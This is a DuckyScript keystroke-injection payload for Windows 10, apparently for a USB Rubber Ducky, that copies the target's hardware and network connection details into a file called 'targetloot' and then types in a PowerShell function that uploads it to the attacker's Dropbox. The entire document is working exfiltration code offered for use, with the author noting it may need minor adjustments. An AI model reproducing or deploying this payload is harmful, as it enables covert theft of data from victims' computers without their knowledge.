REM_BLOCK
Title: Hard_Con_Exfil
Author: LulzAnarchyAnon
Description: This payload navagates it's way to Hardware, and Connection properties.
It then copies, and saves it as a notepad file named "targetloot" to the Downloads folder. 
It is then exfiltrated via a DropBox Upload.
Target: Windows 10
Props: Darren Kitchen
Props: HUGE PROPS TO I am Jakoby for letting me script kiddie his DropBox PowerShell script! 
Props: Check out I am Jakoby on Youtube to set up your DropBox for uploads.
Props: Don't forget to Like and Subscribe!
Version: 1.0
Category: Exfiltration 

This payload may need minor adjustments to run properly depending on 
Attacker, and Target devices.

In the First stage the targets data is saved to the target device. 
In the Second stage the loot is uploaded via dropbox.
END_REM

DUCKY_LANG US
DELAY 2000
DEFAULT_DELAY 500

REM Stage 1

GUI 
STRINGLN network properties
REPEAT 3 TAB
ENTER
GUI r
STRINGLN notepad
CTRL v
CTRL s
ALT d
STRINGLN %USERPROFILE%\Downloads
REPEAT 6 TAB
STRINGLN targetloot
REPEAT 2 ALT F4
DELAY 2000

REM Stage 2

GUI r
STRING powershell 
ENTER
DELAY 2000

STRINGLN function DropBox-Upload {
STRINGLN [CmdletBinding()]
STRINGLN param (
STRINGLN [Parameter (Mandatory = $True, ValueFromPipeline = $True)]
STRINGLN [Alias("f")]
STRINGLN [string]$SourceFilePath
STRINGLN ) 
STRINGLN $DropBoxAccessToken = "YOUR-DROPBOX-ACCESS-TOKEN-HERE
STRINGLN "
STRINGLN "   # Replace with your DropBox Access Token
STRINGLN $outputFile = Split-Path $SourceFilePath -leaf
STRINGLN $TargetFilePath="/$outputFile"
STRINGLN $arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
STRINGLN $authorization = "Bearer " + $DropBoxAccessToken
STRINGLN $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
STRINGLN $headers.Add("Authorization", $authorization)
STRINGLN $headers.Add("Dropbox-API-Arg", $arg)
STRINGLN $headers.Add("Content-Type", 'application/octet-stream')
STRINGLN Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
STRING }
DELAY 5000
GUI r
STRINGLN %USERPROFILE%\Downloads\
STRING targetloot
GUI r
STRINGLN %USERPROFILE%\Downloads\
STRING targetloot
ALT h
REPEAT 5 TAB
ENTER
ALT F4
DELAY 1000
CTRL v
DELAY 5000
STRINGLN | DropBox-Upload
DELAY 5000
ENTER
ALT F4
ENTER
